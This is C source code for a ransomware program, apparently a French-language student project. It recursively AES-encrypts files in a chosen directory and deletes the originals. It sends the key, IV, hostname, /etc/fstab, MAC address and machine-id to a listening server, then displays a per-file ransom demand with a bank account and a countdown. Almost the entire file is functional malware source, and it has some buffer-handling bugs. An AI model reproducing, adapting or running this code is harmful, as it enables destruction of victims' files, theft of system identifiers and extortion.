#include "ransomlib.h"
#include <dirent.h> 
#include <sys/socket.h> // for socket
#include <unistd.h> 
#include <arpa/inet.h>
#include <vlc/vlc.h>

#define ip "127.0.0.1"
#define port 8080

//sudo apt-get install libvlc-dev || gcc my_program.c -lvlc -o my_program

void vlc() 
{
	libvlc_instance_t *my_instance;

	my_instance = libvlc_new(0, NULL);

	libvlc_media_t *my_media_file;
	my_media_file = libvlc_media_new_path(my_instance, "/home/kali/Bureau/Projet/Computer.mp4");
	
		// Create player
	libvlc_media_player_t *my_player;
	my_player = libvlc_media_player_new_from_media(my_media_file);

	// Start playing
	libvlc_media_player_play(my_player);
	sleep(15); /* Wait for 15 seconds */
	
	libvlc_media_release(my_media_file);
	libvlc_media_player_release(my_player);
	libvlc_release(my_instance);
}

void usage()
{
	printf("--------------------------------------\n");
	printf("Bienvenue sur le projet de Ransomware\n");
	printf("--------------------------------------\n");
	printf("Procédure à suivre pour lancé le code:\n \n");
	printf("[1] -- Se mettre dans le dossier dans lequel le code s'y trouve\n");
	printf("[2] -- Taper la commande < gcc -o ransom ransom.c ransomlib.c -lcrypto > 	\n");
	printf("[3] -- Lancer le server dans un autre terminal avec la commande < nc -l -v -p 8080 >	\n");
	printf("[4] -- Revenez dans votre premier terminal pour lancer l'encryption \n");
	printf("[5] -- La commande est celle ci : < ./ransom (chemin du repertoire à encrypter) -enc >	\n");
	printf("[6] -- Récuperer la clé et l'iv sur le server\n");
	printf("[7] -- Décrypter : <./ransom (chemin du répertoire à décrypter) -dec (clé) (iv)>	\n");
	printf("--------------------------------------\n");

	printf("[-enc] --> encryption	\n");
	printf("[-dec] --> decryption	\n");
	printf("[-help] --> aide	\n");
};

int is_a_video(char *filename)
{
	int n = strlen(filename)-4;
	char extention[4] ;

	for(int i=0; i<5;i++)
	{
		extention[i] = filename[n+i];
	}

	if(strcmp(extention, ".mp4")==0 || strcmp(extention, ".mkv")==0)
	{
		// printf("c'est une vidéo\n");
		return 0 ;
	}
}

int is_encrypted(char *filename) //Ici on assume que le nom de nos fichiers cryptés seront en ".Pwnd"
{
	int n = strlen(filename)-5;
	char extention[5] ;

	for(int i=0; i<6;i++)
	{
		extention[i] = filename[n+i];
	}

	if(strcmp(extention, ".Pwnd")==0)
	{
		// printf("%s est déjà crypter\n", filename);
		return 0 ;
	}
	else
	{
		// printf("Le fichier n'est pas encore crypter\n");
		return 1;
	}
}
void timer (int mount)
{
	int is_paid = 0;
    for( int i = 10; i > 0; i--)
 	{
    	printf("Il vous reste %d secondes.\n", i);
	printf("Compte bancaire : BE56751251151 \n");
    	sleep(1);
 	}
	printf("Avez-vous payé ? (1=oui) \n");
	scanf("%d",&is_paid);
	if (is_paid == 1)
	{
		printf("Merci d'avoir payé : %d Euros \n",mount);
	}
	else
	{
		printf("Vos fichiers seront crypté à jamais!");
	}
	
}
int amount_to_pay(int nb)
{
	printf("Nombre de fichier crypté : %d	\n",nb);
	printf("Tarif par fichier crypté : 500 euros \n");
	int mount = nb*500;
	printf("Votre raçons à payer s'élève à : %d \n",mount );
	timer(mount);
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag,int *nb)
{
	DIR* dir = opendir(name);
	
	if (dir == NULL)
	{
		handleErrors();
	}
	
	struct dirent* entity;
	entity = readdir(dir);
	
	while (entity != NULL)
	{
		 if (entity->d_name[0] != '.')
		{
			char path[BUFSIZE] = {0};
			strcat(path, name);
			strcat(path, "/");
			strcat(path, entity->d_name);
				
						
			if(entity->d_type == DT_DIR && strcmp(entity->d_name, ".")!=0 && strcmp(entity->d_name, "..")!=0)
			{
				listdir(path, iv, key, de_flag,nb);
			}
			
			if(de_flag=='e' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==0 && !is_a_video(entity->d_name) ==0)
			{				
				encrypt(key, iv, path);
				
				*nb = *nb+1;
				remove(path);				
			}
			
			else if(de_flag=='d' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==1)
			{
				decrypt(key, iv, path);
				remove(path);
			}
		}
		entity = readdir(dir);
	}
	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	if (!RAND_bytes(key, sizeKey) || !RAND_bytes(iv, sizeIv)) 
	{
			
		handleErrors();
	}
	
	bytes_to_hexa(key , pKey, sizeKey);
	bytes_to_hexa(iv , pIv, sizeIv);
}

void send_txt(char * filename, int sockID)
{
	FILE * file = fopen(filename, "r");
	char line[BUFSIZE];
	char filename_path[BUFSIZE] = {0};

	strcat(filename_path, "Les données viennent du fichier: ");
	strcat(filename_path, filename);
	strcat(filename_path, "\n");
	send(sockID, (const char *)filename_path, strlen(filename_path), 0);
	
	while (fgets(line, sizeof(line), file)) 
	{
		send(sockID, (const char *)line, strlen(line), 0);
	}
	fclose(file);
}

int send_key(char *pKey, char *pIv)
{
	int sockID;
	
	sockID = socket(AF_INET,SOCK_STREAM, 0);

	struct sockaddr_in serveraddr;
	serveraddr.sin_family = AF_INET;
	serveraddr.sin_port = htons(port);
	serveraddr.sin_addr.s_addr = inet_addr(ip);

	char *send_key = "La clé de la victime: ";
	char *send_iv = "L'IV de la victime: ";
	char *space = "\t \n";
	char *hostname= "Le nom de la machine: ";
	char *ip_machine= "L'IP de la machine: ";
	char *separate = "--------------------------------------\n";
	
	char hostname_buffer[BUFSIZE];
	
	// connect the client socket to server socket	
	if (connect(sockID, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) != 0) 
	{
		printf("Connection with the server failed !\n");
		exit(0);
	}
	else
	{
		printf("Connected to the server !\n");

		// To retrieve hostname
		gethostname(hostname_buffer, sizeof(hostname_buffer));
		
		send(sockID, (const char *)send_key, strlen(send_key), 0);
		send(sockID, (const char *)pKey, strlen(pKey), 0);
		send(sockID, (const char *)space, strlen(space), 0); //Eviter que la clé soit mélangé avec le texte qui suit
		send(sockID, (const char *)send_iv, strlen(send_iv), 0);
		send(sockID, (const char *)pIv, strlen(pIv), 0);
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)hostname, strlen(hostname), 0);
		send(sockID, (const char *)hostname_buffer, strlen(hostname_buffer), 0);		
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)ip_machine, strlen(ip_machine), 0);
		send(sockID, (const char *)ip, strlen(ip), 0);
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)separate, strlen(separate), 0);
		send_txt("/etc/fstab", sockID);
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)separate, strlen(separate), 0);
		send_txt("/sys/class/net/eth0/address", sockID);		
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)separate, strlen(separate), 0);
		send_txt("/etc/machine-id", sockID);
	}
	close(sockID);
}

int main (int argc, char * argv[])
{
	unsigned char key[AES_256_KEY_SIZE];
	unsigned char iv[AES_BLOCK_SIZE];

	int sizeKey = AES_256_KEY_SIZE; 
	int sizeIv = AES_BLOCK_SIZE;
	int nb_encrpt_file = 0;
	
	if(strcmp(argv[2], "-enc")==0 && argc==3) 
	{
		char * pKey = (char *) malloc(sizeof(key)*2+1);
		char * pIv = (char *) malloc(sizeof(iv)*2+1);
		
		printf("The directory is %s\n", argv[1]);
		generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
		send_key(pKey, pIv);
		listdir(argv[1], iv, key, 'e',&nb_encrpt_file);

		memset(pKey, '\0', sizeKey);
		memset(pIv, '\0', sizeIv);
		printf("--------------------------------------\n");
		amount_to_pay(nb_encrpt_file);
	}
	
	if (strcmp(argv[2], "-dec")==0 && argc==5)
	{
		hexa_to_bytes(argv[3] , key, sizeKey);	
		hexa_to_bytes(argv[4] , iv, sizeIv);
		listdir(argv[1], iv, key, 'd',&nb_encrpt_file);
		printf("Merci d'avoir payer la rançon !");
		
		memset(key, '\0', sizeKey); 
		memset(iv, '\0', sizeIv);
	}
	
	if(strcmp(argv[1], "--help")==0 & argc==2)
	{
		usage();
	}
}
